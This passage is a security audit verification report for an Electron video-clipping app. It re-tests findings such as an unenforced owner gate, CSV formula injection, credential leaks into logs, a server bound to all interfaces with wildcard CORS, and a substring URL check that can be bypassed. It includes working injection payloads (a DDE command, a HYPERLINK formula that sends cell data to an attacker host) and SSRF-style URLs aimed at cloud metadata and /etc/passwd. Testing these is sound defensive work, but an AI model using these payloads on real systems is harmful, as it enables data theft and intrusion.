# Verification — slice 3 (server behaviour, security, privacy)

Thirteen findings re-run from scratch: E-4, E-6, E-7, F-5, F-6, F-7, F-8, G-1,
G-2, G-3, G-5, G-10, G-11.

**No product file was changed.** `git status` shows only new files under
`audit/run-1/verify/`. Build *output* (`dist/`, `electron/dist/`) is gitignored;
I built my own frozen mirrors under `/tmp/v3-app-*` instead and restored the
repo's `electron/dist/server.cjs` byte-for-byte (verified with `cmp`).

## How I verified

Everything here was driven against the **real app**, not the dev server: a
frozen production-shape mirror (`v-build-mirror.cjs` → vanilla `vite build` +
`scripts/build-server.cjs` + unmodified `electron/*.cjs`), launched through
Playwright with a **fresh `--user-data-dir` on every single launch**. I wrote my
own scripts from each finding's Steps; I did not run the original authors'
scripts at all, for any finding.

My own scaffolding, disclosed:

- `v-stub.cjs` — builds its root from the shared `audit/harness/make-stub-root.cjs`
  (so ffmpeg and deno stay real) and then replaces `yt-dlp` with my own fake that
  adds: `argv.log` (one JSON line per invocation with the literal argv, which is
  how `--cookies` provenance is *measured* rather than argued); a cookie
  write-back, which real yt-dlp performs on close and the shared stub does not;
  per-stage failure switches (`failVersion` / `failInfo` / `failDownload` /
  `failAuth`) so one stage can be failed without the `--version` probe also
  failing and sending `resolveYtDlp()` to a system yt-dlp that would reach the
  network; and per-stage delays.
- `v-lib.cjs` — launch, raw HTTP from outside the renderer (any method, any
  body, any `localAddress`), `/proc/net/tcp` reading with socket→pid attribution.
- Three build shapes: `public` (feature compiled out), `owner` (this machine
  allowlisted), `nonowner` (a different machine allowlisted). Salt
  `verify-slice3-salt-9d41` — mine, not the original author's.

Scripts and captured output: `audit/run-1/verify/slice-3/` (`out/*.json`,
`out/<label>/*.png`, `logs/*.txt`).

Every finding was attempted at least twice from a cold start. Several carry a
**control** — a case that must come out the other way — because a probe that
cannot fail proves nothing.

---

### E-4 — The owner gate has no server side: on a non-allowlisted machine the UI is hidden but the whole feature still works
- **Verdict**: CONFIRMED
- **Severity**: major
- **Runs**: 2 attempts (plus one dedicated run for the progress endpoint), 2 reproduced
- **What I did**: Built a `nonowner` shape myself — channel data compiled in,
  the allowlist holding the hash of a machine that is not this one. Cold start,
  confirmed `#ui-channel-link` is absent and the words "Channel data" appear
  nowhere in the rendered text. Then, with no credential of any kind, POSTed
  `/api/channel/export` (`deliver:"path"`, 3 videos, all three parts), POSTed
  `/api/channel/export/cancel`, and opened
  `GET /api/channel/export/progress`. Finally handed the returned file list to
  `window.electronAPI.saveExport` with a directory of my choosing. Ran the same
  script against the `public` and `owner` shapes as controls.
- **Proof**: `audit/run-1/verify/slice-3/v-e4-e6-e7.cjs`,
  `v-e4-progress.cjs`; `out/v-e467-all-r1.json`, `out/v-e467-all-r2.json`,
  `out/v-e4-progress.json`, `logs/e467-r*.out.txt`.
  On the **nonowner** build:
  ```
  UI:        navHasChannelLink=false   "Channel data" in body text: false
  export:    200  counts {"videos":3,"comments":21,"transcripts":6}
  cancel:    200
  progress:  200  text/event-stream  data: {"phase":"listing","current":0,"total":0}
  saveExport:{"ok":true,"path":"/tmp/v3-e4-steal-nonowner/verify-exfil-copy"}
  on disk:   comments.csv summary.csv transcripts.csv video-status.csv videos.csv
  ```
  Control, the **public** build: all three endpoints are `404` and the string
  `/api/channel/export` is absent from `electron/dist/server.cjs` — so the
  *build-time* layer genuinely removes the feature; it is only the *run-time*
  layer that is cosmetic. Worth recording, because it bounds the finding:
  a public build is not exposed by E-4 at all. The exposure needs a
  channel-enabled build to exist on the machine, which is exactly the shape
  the owner distributes to a small group.
- Severity kept at major: no handler in `server/channelRoutes.ts` asks who is
  calling, the inventory is explicit that both layers must hold, and there is no
  workaround. Not raised, because it is not reachable in the public build.

---

### E-6 — `owner:check` is a hash oracle, and it is live in the public build
- **Verdict**: DOWNGRADED
- **Severity**: minor (original: major)
- **Runs**: 2 attempts, 2 reproduced (the behaviour is real; the rating is what I disagree with)
- **What I did**: In all three shapes, called
  `window.electronAPI.isOwnerMachine(list, salt)` from the page with a salt and
  a list of my own choosing: the build's real hash, a wrong hash, a hash I
  computed myself from `/etc/machine-id` under *my* salt `probe-salt-chosen-by-the-caller`,
  a hash of a wrong id under the same salt, an empty list, an empty salt and a
  non-array. Also grepped the shipped `preload.cjs`, `main.cjs` and the built
  renderer bundle in each shape.
- **Proof**: `audit/run-1/verify/slice-3/v-e4-e6-e7.cjs`;
  `out/v-e467-all-r1.json` / `-r2.json`, key `E6`.
  In the **public** build:
  ```
  present:            true     (the handler ships, in a build with no feature)
  oracleGuessRight:   true     <- caller-chosen salt, caller-computed hash
  oracleGuessWrong:   false
  withEmptyList:      false    withEmptySalt: false    nonArray: false
  renderer bundle calls isOwnerMachine : false
  preload.cjs ships "owner:check"      : true
  main.cjs   ships "owner:check"       : true
  ```
  Identical in `owner` and `nonowner`. The handler only ever answers a boolean;
  the raw id and its hash never cross the bridge, in any shape — which the
  original also states.
- **Why the original was wrong**: the *behaviour* is exactly as described, but
  "brute-force the machine id" overstates what the oracle buys. The input is a
  128-bit platform id (`/etc/machine-id`, a Windows `MachineGuid`, a macOS
  `IOPlatformUUID`), so a search is not feasible — the oracle can only
  **confirm** an id the caller already holds, and a caller who already holds the
  machine id learns nothing from the answer. The other half, "learn an owner
  gate exists in a build that is supposed to contain no trace of the feature",
  is real but is already fully covered by E-1 (blocker), which shows the public
  bundle still carries the literal strings `Channel data`, `ui-channel-link` and
  `onScreen("channel")`. And reaching the handler at all requires code execution
  inside the renderer (the preload bridge is not network-reachable), at which
  point the attacker has better options. What is left is a real but small defect:
  an IPC handler registered unconditionally for a feature that is supposed to be
  absent, and an existence disclosure. That is minor, not major.

---

### E-7 — CSV formula injection: a comment starting with `=` is written unescaped
- **Verdict**: CONFIRMED
- **Severity**: major
- **Runs**: 2 attempts, 2 reproduced
- **What I did**: Scripted the channel stub with seven comments and a caption
  written by third parties, covering every spreadsheet formula prefix and the
  two payload families that matter: `=cmd reply`, `=HYPERLINK("http://evil.example/?x="&A1,"click")`,
  `+1+1`, `-2-2`, `@SUM(1:1)`, the DDE form `=cmd|' /C calc'!A1`, and a caption
  `=1+1, "quoted" caption 🎬 עברית`. Ran a real export, then read the CSVs back
  **out of the server's own output folder** (`/tmp/ytchan-*`) with an RFC 4180
  parser I wrote in the verification script, and again from the copy
  `export:save` wrote.
- **Proof**: `audit/run-1/verify/slice-3/v-e4-e6-e7.cjs` (`auditCsvFolder`,
  `parseCsv`); `out/v-e467-all-r2.json`, keys `E7_csv_serverFolder` / `E7_csv`.
  ```
  formulaCells  : 21        formulaColumns: ["comments.csv/text","transcripts.csv/text"]
  comments.csv   row 2  col text  first "="  "=cmd reply"
  comments.csv   row 3  col text  first "="  "=HYPERLINK(\"http://evil.example/?x=\"&A1,\"click\")"
  comments.csv   row 4  col text  first "+"  "+1+1"
  comments.csv   row 5  col text  first "-"  "-2-2"
  comments.csv   row 6  col text  first "@"  "@SUM(1:1)"
  comments.csv   row 7  col text  first "="  "=cmd|' /C calc'!A1"
  transcripts.csv row 2 col text  first "="  "=1+1, \"quoted\" caption 🎬 עברית"
  (21 = the six formula comments × three videos, plus one caption per video)
  the copy written by export:save: 21 formula cells, identical
  ```
  Everything else about the bytes is right, which I confirmed in the same pass
  and which matters for the fix: UTF-8 BOM, CRLF endings, no ragged rows, and a
  clean round-trip through my own parser for a comma, a doubled quote, emoji and
  RTL text. The only missing defence is formula neutralisation, in both copies of
  the writer (`server/csv.ts: csvCell`, `src/lib/channel.ts: rowsToCsv`), each of
  which quotes and stops.
- Severity kept at major: the payload is chosen by whoever leaves the comment,
  not by the owner, and lands in a file the owner opens in a spreadsheet. Not
  raised to blocker because current Excel blocks DDE by default and prompts
  before `=WEBSERVICE`, so the worst case needs the owner to click through.

---

### F-5 — Copy diagnostics copies an empty report for any failure during the metadata pre-flight — no job id, no engine stderr, no log lines
- **Verdict**: DOWNGRADED
- **Severity**: major (original: blocker)
- **Runs**: 3 attempts, 3 reproduced
- **What I did**: One cold start with a saved sign-in seeded *before* launch (so
  the sign-in modal is not in the way and the renderer really sends
  `cookiesFromBrowser`), loaded a video, typed an in and out point, then ran five
  cases through the real "Cut as one file" button. For each case I also fetched
  the same `/api/download` request over raw HTTP, so the response shape is read
  off the wire rather than inferred. Then I pressed the real "Copy diagnostics"
  button and read Electron's own clipboard.
- **Proof**: `audit/run-1/verify/slice-3/v-f5-f8-diagnostics.cjs`;
  `out/v-f58-r1.json`, `-r2.json`, `-r3.json`,
  `out/v-f58-r1/bundle-A-preflight-crash.txt` (the whole 639-byte report),
  `out/v-f58-r1/bundle-B-download-stage.txt` (the good one, for contrast),
  `out/v-f58-r1/case-A-preflight-crash.png`.
  ```
  case                 wireStatus  wireKeys                                      diagnostics  bundle
  A pre-flight crash   500         ["error","code","cause","action","preserved"] absent       639 B
  B download stage     500         [... ,"diagnostics"]                          present      2378 B
  ```
  The A bundle, verbatim:
  ```
  App: unknown / OS: unknown / yt-dlp: unknown / ffmpeg: unknown / Job: unknown
  --- engine stderr, this run only (0 lines) ---   (none captured)
  --- log lines for job unknown (0 lines) ---      (none captured)
  ```
- **Why the original over-rated it**: two things. First, nothing about the
  user's clipping job is lost or blocked — the failure itself is reported
  correctly, with a cause and an action; it is the developer-facing attachment
  that is empty. Second, there **is** a workaround, which I measured rather than
  assumed: the pre-flight stderr does reach `<userData>/logs/main.log`
  (`F5_preflightStderrInMainLog: true` in `out/v-f58-r3.json`), so the
  Diagnostics disclosure's "Copy log" recovers exactly the text the per-failure
  bundle dropped. The workaround is undiscoverable (it lives inside the YouTube
  sign-in modal) and it is itself unsafe (F-6), but it exists, and "survivable
  or has a workaround" is where the audit's own bar puts this. Major, not
  blocker.

---

### F-6 — "Copy log" puts raw cookie values, bearer tokens, the user's email and absolute home paths on the clipboard, under a line promising it does not
- **Verdict**: RAISED
- **Severity**: blocker (original: major)
- **Runs**: 2 attempts, 2 reproduced
- **What I did**: Cold start with no saved sign-in, so the YouTube sign-in modal
  — which is where `DiagnosticsDisclosure` actually lives — is up. Made the
  engine fail with stderr carrying nine distinct synthetic markers in the shapes
  the product would really meet: a Netscape cookie row, a `Cookie:` header, an
  `Authorization: Bearer` header, an `access_token`, a signed `googlevideo` URL
  with `sig=` and `id=`, an email address and an absolute `/root/...` path.
  Expanded "Diagnostics" with a real click, read the promise sentence the UI
  shows, pressed the real **"Copy log"** button, and read Electron's own
  `clipboard.readText()`.
- **Proof**: `audit/run-1/verify/slice-3/v-f67-secrets.cjs`;
  `out/v-f67-r1.json`, `out/v-f67-r2.json`,
  `out/v-f6-r2/clipboard.redacted.txt`, `out/v-f6-r2/main.log.redacted.txt`,
  `out/v-f6-r2/02-after-copy-log.png`.
  ```
  markers planted                        : 9
  markers in <userData>/logs/main.log    : 9
  markers on the clipboard (Copy log)    : 9
  markers in the <pre> rendered on screen: 9   (directly under the promise)
  UI note after the press                : "Copied to clipboard."
  the sentence shown two lines above it  :
    "The app's event log. It records what happened and when, with no
     cookies, tokens or personal data. If the app closed unexpectedly,
     the cause is here."
  ```
  The matched shapes, redacted — every value below is a synthetic marker and is
  truncated here on purpose:
  ```
  cookie row     : …RUE\t/\tTRUE\t2000000000\tSID\tAKxxV3…REDACTED(18 chars)
  cookie header  : …[debug] Cookie: SID=AKxxV3…REDACTED(21 chars)
  __Secure-3PSID : …; __Secure-3PSID=AKxxV3…REDACTED(23 chars)
  bearer         : …Authorization: Bearer ya29.V…REDACTED(24 chars)
  access_token   : …access_token=V3ACCE…REDACTED(19 chars)
  signed URL     : …?expire=1&id=o-V3ST…REDACTED(18 chars) &sig=V3SIGN…REDACTED(17 chars)
  email          : …signed in as user sam.cl…REDACTED(23 chars)
  home path      : …unable to write to /root/…REDACTED(41 chars)
  ```
  Separately, and this part needs no engine behaviour at all, the clipboard also
  carried real absolute install paths every run, because `server/index.ts` logs
  `options=${JSON.stringify(options)}` on every `/api/info`, and that object
  contains the cookie file's absolute path:
  `/home/user/stream-trimmer/node_modules/...`, `/tmp/v3stub-.../resources/bin`.
  On a Windows install that is `C:\Users\<name>\...`.
- **Why I raised it**: the audit's bar is job-centric, and this does not stop a
  cut. But the brief asks to flag a privacy leak that was under-rated, and this
  is the one place in the product where the UI makes a categorical guarantee
  ("no cookies, tokens or personal data"), tells the user the file is what to
  send to the developer, and then puts **completely unfiltered** engine output on
  their clipboard. There is no redactor anywhere on that path:
  `ipcMain.handle("diagnostics:copy")` is `clipboard.writeText(logger.tail(500))`,
  and `src/lib/diagnostics.ts`'s redactor lives in the renderer and is never
  reached. The disclosure is irreversible the moment it is pasted, the button is
  the only supported way to send the log, and the product's own redactor treats
  exactly these shapes as must-remove — which is the team's own statement that
  this text carries credentials.
  **Honest bound**: the always-true part of the leak is the absolute home path
  and the cookie file's location. Whether live cookie *values* reach stderr
  depends on what the engine prints, and real yt-dlp cannot be exercised here —
  note that the download path does **not** pass `verbose`, while the auth probe
  at `server/index.ts:960` does. What is proven absolutely is that nothing is
  filtered, so whatever the engine prints is what the user hands over.

---

### F-7 — The on-screen failure alert renders the engine's raw stderr unredacted — cookie values, bearer token, email, home path
- **Verdict**: CONFIRMED (and **not** a duplicate of F-6 — see below)
- **Severity**: major
- **Runs**: 2 attempts, 2 reproduced
- **What I did**: Second cold start in the same script, this time with a saved
  sign-in placed in the user-data dir *before* launch so the sign-in modal is
  gone and the workspace is genuinely clickable. Pasted a link, typed
  `00:00:02`–`00:00:08` into the real in/out fields, pressed the real
  "Cut as one file", then read the text of `[role="alert"]` and of the whole
  visible body.
- **Proof**: `audit/run-1/verify/slice-3/v-f67-secrets.cjs` (phase 2);
  `out/v-f67-r1.json`, `out/v-f67-r2.json`,
  `out/v-f7-r2/alert.redacted.txt`, `out/v-f7-r2/03-cut-failed.png`.
  ```
  markers in the on-screen [role="alert"] : 9 / 9
  markers anywhere in the visible body    : 9 / 9
  alert begins:
    "YouTube refused the media request for this video: .youtube.com TRUE / TRUE
     2000000000 SID AKxxV3…REDACTED [debug] Cookie: SID=AKxxV3…REDACTED;
     __Secure-3PSID=AKxxV3…REDACTED [debug] Authorization: Bearer ya29.V…REDACTED …"
  ```
- **One defect or two?** Two, and they should be fixed separately. I tested the
  shared path directly: in the same render, the **per-failure** bundle behind
  "Copy diagnostics" — which does go through `src/lib/diagnostics.ts: redact()` —
  leaked **1 of 9** markers, not 9 (`F7_perFailureBundle: 1`, the googlevideo
  `id=` parameter, which is F-19). So the redactor exists, works, and is simply
  not applied in two different places, in two different processes, in two
  different files:
  - **F-6** is `electron/main.cjs`'s `diagnostics:copy` in the **main process**,
    where no redactor is loaded at all.
  - **F-7** is `DownloadBar` rendering `{error}` in the **renderer**, where the
    redactor is in the same bundle, two imports away, and simply not called.
  They share a root cause ("redaction is applied only to the per-failure
  bundle") but neither fix fixes the other.
- Severity kept at major rather than raised with F-6: the alert exposes secrets
  opportunistically (a screenshot, a screen share, a colleague behind you),
  whereas F-6 actively instructs the user to send them.

---

### F-8 — Copy diagnostics is offered next to a plainly user-fixable error, because that failure path sends no `code`
- **Verdict**: CONFIRMED (with a correction to the finding's chosen reproduction)
- **Severity**: major
- **Runs**: 3 attempts, 3 reproduced
- **What I did**: Ran the finding's own case through the real UI, plus two
  controls that must come out the other way, plus one extra case to test whether
  the finding's trigger is reachable at all.
- **Proof**: `audit/run-1/verify/slice-3/v-f5-f8-diagnostics.cjs`;
  `out/v-f58-r1.json` … `-r3.json`, `out/v-f58-r1/case-C-save-folder-gone.png`,
  `out/v-f58-r1/bundle-C-save-folder-gone.txt`.
  ```
  case                wireStatus  code          copyDiagnosticsButton
  C save folder gone  400         (absent)      SHOWN
  D1 disk full        507         disk_full     absent
  D2 private video    403         private_video absent
  C's on-screen alert:
    "Your in-app YouTube sign-in is no longer valid. Sign in again from the
     YouTube button."   + a "Copy diagnostics" button
  ```
  The wire body for C is `{"error": ..., "diagnostics": ...}` — **no `code`** —
  and `classifyFailureKind(undefined)` is `needsDeveloper`, so the button
  renders. The two coded classifications behave correctly.
- **Correction worth recording.** The finding's example says real `yt-dlp -v`
  always names the cookies file, which is what lets a save-folder error match
  `isCookieError`. That is not how this code path runs the engine: `verbose` is
  passed in exactly one place in `server/index.ts` (line 960, the auth probe);
  the download path never requests it, so real yt-dlp would not print
  `Loading cookies from …` there. Case C therefore only fires because the stderr
  was planted. I re-tested with a **genuine** yt-dlp cookie error that needs no
  `-v` at all (`ERROR: could not find chrome cookies database in "..."`, with a
  browser source):
  ```
  status 400   keys ["error","diagnostics"]   code: ABSENT
  error: "Couldn't read chrome's cookies. The browser may need to be fully
          closed, or that profile isn't supported. You can turn sign-in off
          and retry for standard quality."
  ```
  That message is plainly user-fixable and names its own fix, the response
  carries no `code`, and it goes through the identical renderer path that case C
  shows putting a Copy diagnostics button on screen. So the defect stands on a
  reachable trigger; only the finding's illustration is an artefact. Severity
  stays major.

---

### G-1 — Two downloads of the same clip at once share one work folder and corrupt each other, and both are told they succeeded
- **Verdict**: CONFIRMED
- **Severity**: blocker
- **Runs**: 2 attempts, 2 reproduced
- **What I did**: Cold start, cleared the cache, set the stub to stall 2500 ms,
  then POSTed `/api/download?jobId=job_key_a` with three ranges and, four
  seconds later, an identical body as `job_key_b`. Compared both responses
  against each other and against the file actually on disk, and probed the file
  with the bundled ffmpeg. Added a control: two downloads of *different* ranges.
- **Proof**: `audit/run-1/verify/slice-3/v-g1-g3-g11.cjs` (section G-1);
  `out/v-g1311-r1.json`, `out/v-g1311-r2.json`, `logs/g1311-r*.out.txt`.
  ```
  run 1:
    A -> 200 {"path":"/tmp/ytclip-6ba298865b417666/clip.mp4","size":262192,"segments":3}
    B -> 200 {"path":"/tmp/ytclip-6ba298865b417666/clip.mp4","size":586260,"segments":3}
    same path: true        file on disk afterwards: 586260 bytes
    matches what A was told: FALSE      matches what B was told: true
  run 2: A 524336 / B 1166252, same path, same outcome
  server's own log, run 1:
    job=job_key_a join: re-encode done (?s, expected 12.00s, STILL OFF)
    /api/download handing off job=job_key_a bytes=262192
  control (different ranges): two different folders — ytclip-0345afb7… and ytclip-ce5395ef…
  cancel routes: /api/download/cancel 404, /api/download/stop 404, /api/cancel 404
  ```
  The `(?s)` is `probeDurationSec` failing outright on a file another ffmpeg was
  writing at the same time, and the job answered 200 anyway.
- Severity kept at blocker. The trigger is a double-click on Download or two
  tabs on the same video with the same marks — ordinary use, no attacker. One of
  the two clients is handed a path with a byte count that does not describe the
  file there, and the main process then moves that single file out from under
  the other job. That is a silently wrong deliverable and a lost cut. The clip
  *durations* here (30 s / 60 s) are a stub artefact because the stub does not
  cut; the mechanism — one keyed folder, mutual `rmSync`, mismatched size, failed
  self-probe, two 200s — is real production code and was measured.

---

### G-2 — The server listens on every network interface, not loopback, and allows any origin
- **Verdict**: CONFIRMED
- **Severity**: major
- **Runs**: 2 attempts, 2 reproduced
- **What I did**: Four independent lines, because this is an exposure claim
  against the product's own documentation.
  1. **The socket.** Read the app's port from `window.__API_BASE__`, found the
     `LISTEN` row in `/proc/net/tcp`, decoded the local address, and tied the
     socket **inode back to a pid** by scanning `/proc/*/fd`, so the row is
     provably the Electron main process's and not some other listener's.
  2. **A real off-loopback connection**, from this node process (outside the
     renderer), with the client socket explicitly bound to `192.0.2.2`, this
     container's eth0 address.
  3. **A control.** Before launching the app, I start my own server bound to
     `127.0.0.1` only and run the identical probe against it. If the probe
     cannot tell the two apart it proves nothing.
  4. **CORS**, with a real preflight and a real cross-origin POST.
- **Proof**: `audit/run-1/verify/slice-3/v-g2-bind-cors.cjs`;
  `out/v-g2-r1.json`, `out/v-g2-r2.json`, `out/v-g2-r2/01-app-running.png`,
  `logs/g2-r*.txt`.
  ```
  apiBase http://127.0.0.1:39893
  /proc/net/tcp:
    14: 00000000:9BD5 00000000:0000 0A ... 854859 ...
       local address 00000000 = 0.0.0.0        (loopback would be 0100007F)
       inode 854859 owned by pid 17051:
       .../node_modules/electron/dist/electron ... /tmp/v3-app-public/electron/main.cjs

  GET http://192.0.2.2:39893/api/cache/usage
       -> 200 {"folders":6,"bytes":5454033}
       client socket local=192.0.2.2  remote=192.0.2.2

  CONTROL, my own 127.0.0.1-bound server, same probe:
       /proc row local address 0100007F
       via 127.0.0.1 -> 200
       via 192.0.2.2 -> connect ECONNREFUSED       <- the probe discriminates

  OPTIONS /api/download   Origin: https://evil.example
       -> 204  access-control-allow-origin: *
               access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
  POST /api/info          Origin: https://evil.example
       -> 200  access-control-allow-origin: *   (full metadata body)
  ```
  Reproduced identically on a second cold start (port 44331, same `00000000`,
  same control result).

  **What an attacker on the same network can actually do.** Every line below was
  issued from a socket bound to `192.0.2.2`, with `Origin: https://evil.example`,
  and with no credential of any kind:
  ```
  200 GET  /api/cache/usage                 {"folders":0,"bytes":0}
  200 POST /api/info                        full title/duration/bitrates
  200 POST /api/transcript                  the video's transcript lines
  200 POST /api/comments                    the comment payload
  200 POST /api/auth/youtube/status {app}   {"status":"signed_in", ...}
  200 POST /api/download  (deliver:path)    {"path":"/tmp/ytclip-.../clip.mp4","size":981457}
  200 POST /api/cache/clear                 {"ok":true,"removed":6}
  ```
  Three of those matter beyond information disclosure:
  - **It writes files.** The `/api/download` call left a real 981,457-byte file
    on this machine's disk (`exists: true`, size verified with `statSync`). The
    server caps a call at 600 s of video, and the call is unauthenticated and
    repeatable.
  - **It touches the user's cookies.** `/api/auth/youtube/status` with
    `browser:"app"` both discloses that the user is signed in and causes the
    server to spawn a child with `--cookies /…/yt-cookies.txt` — the canonical
    jar, not a copy (I captured the child's argv: `E_canonicalJarHandedToChild: true`).
    No endpoint returns the cookie *contents*, so this is not credential theft;
    it is a remote trigger for the write-back hazard in G-5.
  - **It destroys work.** `/api/cache/clear` removed six folders, and I reached
    it with `content-type: text/plain`, a "simple" content type a web page can
    POST with **no preflight at all** — so the CORS wildcard is not even needed
    for that one.

  **Not provable here**: whether a given user's own firewall would let a
  neighbour in. What is proven is the bind itself and that the socket answers on
  a non-loopback address on this machine. `server/index.ts:2298` is
  `app.listen(PORT, …)` with no host, next to `electron/main.cjs`'s own port
  picker which is careful to say `srv.listen(0, "127.0.0.1")`.
- Severity kept at major rather than raised: nothing here stops the user doing
  their job and no credential is returned to the caller. I want to be plain
  though — of the thirteen findings in this slice this is the one I would hold a
  release for, because it converts several other findings (G-3's arbitrary-URL
  fetcher, G-8's cache wipe, G-11's path disclosure) from local bugs into
  remotely reachable ones.

---

### G-3 — Any URL containing the text "youtube.com" anywhere is accepted and handed to yt-dlp
- **Verdict**: CONFIRMED
- **Severity**: major
- **Runs**: 2 attempts, 2 reproduced
- **What I did**: POSTed nine URLs to `/api/info` — the six from the finding,
  one genuine YouTube link as a positive control, and two that must be refused —
  and after each one read my stub's `argv.log` to see what the child was
  actually handed.
- **Proof**: `audit/run-1/verify/slice-3/v-g1-g3-g11.cjs` (section G-3);
  `out/v-g1311-r1.json`, `out/v-g1311-r2.json`, key `G3`.
  ```
  200  https://evil.example/collect?ref=youtube.com            spawned, 1 argv element
  200  https://evil.example/youtube.com/x                      spawned, 1 argv element
  200  https://youtube.com@evil.example/x            (userinfo) spawned, 1 argv element
  200  http://127.0.0.1:22/youtube.com               (loopback) spawned, 1 argv element
  200  http://169.254.169.254/youtube.com/latest/meta-data/     spawned, 1 argv element
  200  file:///etc/passwd#youtube.com                (fragment) spawned, 1 argv element
  400  file:///etc/passwd              -> {"error":"URL must be a YouTube link"}   (control)
  400  https://evil.example/x          -> {"error":"URL must be a YouTube link"}   (control)
  ```
  Six of six hosts that are not YouTube passed validation and became yt-dlp's
  first argument; both controls were correctly refused. `urlSchema` is a
  substring test over the whole URL string, so the fragment `#youtube.com` is
  enough to turn a refused `file:///etc/passwd` into an accepted one.
- **Honest bound**: the stub does not fetch, so what I proved is that the server
  accepts these and spawns the engine pointed at them. That real yt-dlp would
  then issue a request to `169.254.169.254` or read `/etc/passwd` is inference
  from yt-dlp's generic extractor, not something I measured. The validation
  bypass itself is measured.
- Severity kept at major: with G-2 this is an unauthenticated fetcher for
  arbitrary URLs, including ones only the user's machine can reach, and it is the
  single check that was meant to keep the engine pointed at YouTube.

---

### G-5 — /api/info, /api/transcript, /api/comments and /api/auth/youtube/status hand the user's real cookie jar to yt-dlp, bypassing cookieJar.ts — and a bad write-back silently signs the user out
- **Verdict**: CONFIRMED
- **Severity**: major
- **Runs**: 2 attempts, 2 reproduced (identical both times)
- **What I did**: Cold start of the real app, then wrote a synthetic signed-in
  Netscape jar to `<userData>/yt-cookies.txt` — the exact file
  `electron/main.cjs:190` puts in `YT_CLIPPER_COOKIE_FILE`, so the canonical path
  is the product's own, not one I injected. Then:
  1. **Provenance.** For each of five endpoints, cleared `argv.log`, made one
     request with `cookiesFromBrowser:"app"` (or `browser:"app"`), and read the
     literal `--cookies` value out of every child's argv, comparing it
     byte-for-byte against the canonical path and against `cookieJar.ts`'s
     `/tmp/ytcookie-*` private-copy prefix.
  2. **Damage.** For each of five routes × three stale write-backs (empty,
     header-only, cookies with no auth cookie): restored a good jar, recorded
     bytes and sha256, made the call, then re-read bytes and sha256 **and** asked
     the product's own `window.electronAPI.probeYouTube()` whether a sign-in is
     still saved.
  3. **Concurrency**, with a write-back split in half around a 250 ms pause.
- **Proof**: `audit/run-1/verify/slice-3/v-g5-cookiejar.cjs`;
  `out/v-g5-r1.json`, `out/v-g5-r2.json`, `logs/g5-r*.out.txt`.

  Which path each endpoint hands the child — from the child's own argv:
  ```
  /api/info                    runs=1  canonical=1  privateCopy=0   /tmp/…/yt-cookies.txt
  /api/transcript              runs=1  canonical=1  privateCopy=0   /tmp/…/yt-cookies.txt
  /api/comments                runs=1  canonical=1  privateCopy=0   /tmp/…/yt-cookies.txt
  /api/auth/youtube/status     runs=1  canonical=1  privateCopy=0   /tmp/…/yt-cookies.txt
  /api/download                runs=2  canonical=0  privateCopy=2   /tmp/ytcookie-d7UZJ9/cookies.txt …
  /api/download (quality best) runs=6  canonical=0  privateCopy=6   /tmp/ytcookie-5m0xq7/cookies.txt …
  ```

  The write-back damage, with real bytes on a real file and the product's own
  sign-in verdict:
  ```
  route                     write-back     bytes        jar changed  signed in
  /api/info                 empty          307 -> 0     yes          true -> FALSE
  /api/info                 headerOnly     307 -> 79    yes          true -> FALSE
  /api/info                 noAuthCookie   307 -> 138   yes          true -> FALSE
  /api/transcript           (all three)    307 -> 0/79/138           true -> FALSE
  /api/comments             (all three)    307 -> 0/79/138           true -> FALSE
  /api/auth/youtube/status  (all three)    307 -> 0/79/138           true -> FALSE
  /api/download             empty          307 -> 307   NO           true -> true
  /api/download             headerOnly     307 -> 307   NO           true -> true
  /api/download             noAuthCookie   307 -> 307   NO           true -> true
  ```
  Two concurrent `/api/info` calls — what the renderer does on an ordinary URL
  paste — left the canonical jar structurally wrong: 307 bytes and 2 cookie lines
  in, 461 bytes and 4 cookie lines out, with a spliced fragment (`456789`) on a
  line of its own, i.e. two half-writes interleaved. Two concurrent
  `/api/download` calls left it valid and still signed in, which is
  `cookieJar.ts` doing exactly what its header promises.
- **What is proven and what is inference.** Fully real: which path each endpoint
  hands the child (captured argv), and what happens to that file when something
  writes it back (real bytes on disk, real sign-in verdict from the product's own
  parser). **Not provable here**: real yt-dlp's write-back, because YouTube is
  unreachable. My stub performs the write-back that `server/cookieJar.ts`'s own
  header states as fact ("yt-dlp writes its cookie jar back to whatever
  `--cookies` file it was given on EVERY run"), which is the premise the whole
  module exists for.
- Severity kept at major, and I thought hard about raising it to blocker. The
  consequence is the loss of the user's saved sign-in with no backup and no
  message, on the four most frequent yt-dlp runs in the product (every URL paste
  and every launch). I held at major for two reasons: the destructive step is the
  engine's write-back, which I could not observe with a real engine; and the loss
  is recoverable — the user re-exports cookies.txt and re-imports it, and the UI
  does tell them they are signed out. If the team confirms real yt-dlp's
  write-back behaviour against a stale session, this becomes blocker-grade.

---

### G-10 — Cancelling a download does not stop it: yt-dlp keeps running and there is no cancel endpoint
- **Verdict**: CONFIRMED
- **Severity**: major
- **Runs**: 2 attempts, 2 reproduced (after I fixed my own counter — see below)
- **What I did**: Cold start with the stub stalling only the *download* stage by
  25 s, so the section child cannot possibly finish inside the observation
  window and "still alive" cannot be confused with "still working". POSTed
  `/api/download`, destroyed the client socket at t=4 s with the section run in
  flight, then tracked **that specific child's pid** in `/proc` at +0.3 s,
  +1.5 s, +4 s and +12 s. Probed four plausible cancel routes, with
  `GET /api/cache/usage` as a control for the 404s.
- **Proof**: `audit/run-1/verify/slice-3/v-g10-cancel.cjs`;
  `out/v-g10-r1.json`, `out/v-g10-r2.json`, `logs/g10-r*.out.txt`.
  ```
  t=3.8s (section run in flight) : trackedPid=14629 alive=true
  >>> client socket destroyed
  t=+0.3s  after abort           : trackedPid=14629 alive=true
  t=+1.5s  after abort           : trackedPid=14629 alive=true
  t=+4s    after abort           : trackedPid=14629 alive=true
  t=+12s   after abort           : trackedPid=14629 alive=true
  server log mentions a kill     : false
  POST /api/download/cancel 404   /stop 404   /api/cancel 404   /download/abort 404
  GET  /api/cache/usage     200   (so the 404s are real absences, not a dead server)
  ```
  **Control, which is what makes this worth anything**: the same script aborts a
  `/api/auth/youtube/status` request, whose handler *does* register
  `res.on("close")` and SIGKILL its child (`server/index.ts:1047-1049`). It
  snapshots the pre-existing `--simulate` children first and tracks only the new
  one:
  ```
  t=2.5s (probe child alive) : pid=14835 alive=true
  >>> client socket destroyed
  t=+0.6s after abort        : pid=14835 alive=FALSE
  t=+2.1s after abort        : pid=14835 alive=FALSE
  ```
  So the detector sees a kill within 600 ms when one happens. It sees none on
  `/api/download`.
- **A note on my own first attempt**, for anyone re-running this: counting *all*
  stub children rather than tracking one pid gives a false answer in both
